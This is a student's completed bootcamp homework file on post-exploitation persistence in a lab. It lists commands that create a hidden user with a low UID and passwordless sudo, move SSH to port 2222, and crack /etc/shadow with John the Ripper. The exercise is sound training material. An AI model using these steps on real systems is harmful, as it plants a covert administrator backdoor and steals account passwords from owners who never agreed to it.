## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - **`adduser --no-create-home `**

2. Give your secret user a password: 
    - **`passwd sysd`**

3. Give your secret user a system UID < 1000:
    - **`usermod -u 36 sysd`**

4. Give your secret user the same GID:
   - **`groupmod -g 36 sysd`**
	   - **The group "sysd" was already created when I created the user. This command simply modifies the group ID for that group.**

5. Give your secret user full `sudo` access without the need for a password:
   -  **`visudo`**
   **Added the following line to the end of the 'sudoers' file:**
   **`sysd ALL=(ALL) NOPASSWD:ALL`**

6. Test that `sudo` access works without your password:
    ```bash
    su sysd
    <as 'sysd'> sudo -l
    <as 'sysd'> sudo visudo
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    vi /etc/ssh/sshd_config
    <----- Editing 'sshd_config' ----->
    <Added the following line under '#Port 22':>
    Port 2222
    <----- Saved edits to 'sshd_config' ----->
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - **`sudo systemctl restart ssh.service`**

2. Exit the `root` account:
    - **`exit`**

3. SSH to the target machine using your `sysd` account and port `2222`:
    - **`ssh sysd@192.168.6.105 -p 2222`**

4. Use `sudo` to switch to the root user:
    - **`sudo -s`**

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - **`ssh sysd@192.168.6.105 -p 2222`**

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - **`john -wordlist /usr/share/john/password.lst /etc/shadow`**
    **I escalated to the root account using "sudo -s".**

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

<!--stackedit_data:
eyJoaXN0b3J5IjpbOTQ4ODYzNzY1LC04MzIyMDk4NjMsNzE2MD
E3MTY2LC0xODUzMjIzOTA5LDE5NzMzNjMwMDQsNDg4NzEwOTIw
LDIxNzMwMTM4MCwtNTcxNDM5NzQzLC0xNTg5MTA2ODkxLC0yMD
IyODM2NzcsLTE2NjE3NjEwNjEsLTE3NTAxOTUxMjldfQ==
-->